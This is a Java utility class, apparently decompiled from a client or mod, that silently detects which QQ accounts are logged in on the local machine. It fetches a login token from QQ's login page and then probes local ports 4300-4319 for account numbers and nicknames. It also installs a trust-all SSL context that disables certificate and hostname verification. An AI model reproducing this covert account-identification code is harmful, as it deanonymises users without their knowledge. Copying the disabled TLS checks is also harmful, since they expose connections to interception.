package dev.southside.utils.fuck;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.CookieManager;
import java.net.HttpCookie;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class GetQQNumberUtils {
   private static final int PORT_START = 4300;
   private static final int PORT_END = 4319;
   private static final int CONNECT_TIMEOUT = 1500;
   private static final int READ_TIMEOUT = 3000;
   private static final String LOGIN_URL = "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?s_url=https://qzs.qq.com/qzone/v5/loginsucc.html?para=izone";
   private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36";
   private static final Pattern UIN_PATTERN = Pattern.compile("\"uin\"\\s*:\\s*(\\d{5,12})");
   private static final Pattern NICK_PATTERN = Pattern.compile("\"nickname\"\\s*:\\s*\"(.*?)\"");
   private static final SSLContext TRUST_ALL_SSL;
   private static final HostnameVerifier ALLOW_VERIFIER = (hostname, session) -> true;

   public static List<GetQQNumberUtils.QQAccount> detect() {
      Map<String, GetQQNumberUtils.QQAccount> accounts = new LinkedHashMap<>();
      CookieManager cookieManager = new CookieManager();

      String ptLocalToken;
      String cookieHeader;
      try {
         fetchLoginPage(cookieManager);
         ptLocalToken = getCookieValue(cookieManager, "pt_local_token");
         cookieHeader = buildCookieHeader(cookieManager);
         if (ptLocalToken == null) {
            return Collections.emptyList();
         }
      } catch (Exception var11) {
         return Collections.emptyList();
      }

      for (int port = 4300; port <= 4319; port++) {
         try {
            String response = fetchUins(port, ptLocalToken, cookieHeader);
            if (response != null) {
               Matcher uinMatcher = UIN_PATTERN.matcher(response);
               Matcher nickMatcher = NICK_PATTERN.matcher(response);

               while (uinMatcher.find()) {
                  String uin = uinMatcher.group(1);
                  String nick = nickMatcher.find() ? nickMatcher.group(1) : "";
                  accounts.putIfAbsent(uin, new GetQQNumberUtils.QQAccount(uin, nick));
               }
            }
         } catch (Exception var10) {
         }
      }

      return new ArrayList<>(accounts.values());
   }

   public static String detectFirst() {
      List<GetQQNumberUtils.QQAccount> accounts = detect();
      return accounts.isEmpty() ? null : accounts.get(0).uin();
   }

   public static List<String> detectAllUins() {
      List<GetQQNumberUtils.QQAccount> accounts = detect();
      List<String> uins = new ArrayList<>();

      for (GetQQNumberUtils.QQAccount acc : accounts) {
         uins.add(acc.uin());
      }

      return uins;
   }

   private static void fetchLoginPage(CookieManager cookieManager) throws Exception {
      URL url = new URL("https://xui.ptlogin2.qq.com/cgi-bin/xlogin?s_url=https://qzs.qq.com/qzone/v5/loginsucc.html?para=izone");
      HttpsURLConnection conn = (HttpsURLConnection)url.openConnection();
      conn.setSSLSocketFactory(TRUST_ALL_SSL.getSocketFactory());
      conn.setHostnameVerifier(ALLOW_VERIFIER);
      conn.setConnectTimeout(1500);
      conn.setReadTimeout(3000);
      conn.setRequestMethod("GET");
      conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36");
      conn.setInstanceFollowRedirects(true);

      try {
         conn.getResponseCode();
         Map<String, List<String>> headers = conn.getHeaderFields();
         List<String> setCookies = headers.get("Set-Cookie");
         if (setCookies != null) {
            for (String sc : setCookies) {
               try {
                  cookieManager.getCookieStore().add(url.toURI(), HttpCookie.parse(sc).get(0));
               } catch (Exception var11) {
               }
            }
         }
      } finally {
         conn.disconnect();
      }
   }

   private static String getCookieValue(CookieManager cm, String name) {
      for (HttpCookie cookie : cm.getCookieStore().getCookies()) {
         if (name.equals(cookie.getName())) {
            return cookie.getValue();
         }
      }

      return null;
   }

   private static String buildCookieHeader(CookieManager cm) {
      StringBuilder sb = new StringBuilder();

      for (HttpCookie cookie : cm.getCookieStore().getCookies()) {
         if (sb.length() > 0) {
            sb.append("; ");
         }

         sb.append(cookie.getName()).append("=").append(cookie.getValue());
      }

      return sb.toString();
   }

   private static String fetchUins(int port, String ptLocalToken, String cookieHeader) throws Exception {
      String urlStr = "https://localhost.ptlogin2.qq.com:" + port + "/pt_get_uins?callback=ptui_getuins_CB&r=0.8987470931280881&pt_local_tk=" + ptLocalToken;
      URL url = new URL(urlStr);
      HttpsURLConnection conn = (HttpsURLConnection)url.openConnection();
      conn.setSSLSocketFactory(TRUST_ALL_SSL.getSocketFactory());
      conn.setHostnameVerifier(ALLOW_VERIFIER);
      conn.setConnectTimeout(1500);
      conn.setReadTimeout(3000);
      conn.setRequestMethod("GET");
      conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36");
      conn.setRequestProperty("Referer", "https://xui.ptlogin2.qq.com/");
      conn.setRequestProperty("Host", "localhost.ptlogin2.qq.com:" + port);
      conn.setRequestProperty("Cookie", cookieHeader);

      Object reader;
      try {
         int code = conn.getResponseCode();
         if (code == 200) {
            try (BufferedReader readerx = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
               StringBuilder sb = new StringBuilder();

               String line;
               while ((line = readerx.readLine()) != null) {
                  sb.append(line);
               }

               return sb.toString();
            }
         }

         reader = null;
      } finally {
         conn.disconnect();
      }

      return (String)reader;
   }

   static {
      try {
         TRUST_ALL_SSL = SSLContext.getInstance("TLS");
         TRUST_ALL_SSL.init(null, new TrustManager[]{new X509TrustManager() {
            @Override
            public void checkClientTrusted(X509Certificate[] chain, String authType) {
            }

            @Override
            public void checkServerTrusted(X509Certificate[] chain, String authType) {
            }

            @Override
            public X509Certificate[] getAcceptedIssuers() {
               return new X509Certificate[0];
            }
         }}, null);
      } catch (Exception var1) {
         throw new RuntimeException("Failed to init SSL context", var1);
      }
   }

   public record QQAccount(String uin, String nickname) {
      @Override
      public String toString() {
         return this.uin + " (" + this.nickname + ")";
      }
   }
}
